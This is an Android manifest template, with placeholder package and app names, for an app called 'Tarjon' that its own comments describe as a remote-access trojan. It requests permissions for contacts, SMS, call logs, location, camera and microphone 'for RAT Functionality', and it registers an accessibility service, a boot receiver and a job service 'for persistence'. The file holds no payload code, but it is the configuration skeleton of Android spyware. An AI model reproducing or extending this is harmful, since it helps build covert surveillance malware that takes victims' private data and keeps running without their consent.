<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="__PACKAGE_NAME__"
    android:versionCode="1"
    android:versionName="1.0">
    
    <!-- Basic Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    
    <!-- Advanced Permissions for RAT Functionality -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <application
        android:name=".TarjonApplication"
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="__APP_NAME__"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/AppTheme">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Background Services -->
        <service
            android:name=".services.AdminService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync" />
            
        <service
            android:name=".services.TarjonAccessibilityService"
            android:enabled="true"
            android:exported="false"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
        
        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
        
        <!-- Job Scheduler for persistence -->
        <service
            android:name=".services.TarjonJobService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:enabled="true"
            android:exported="false" />
            
    </application>
</manifest>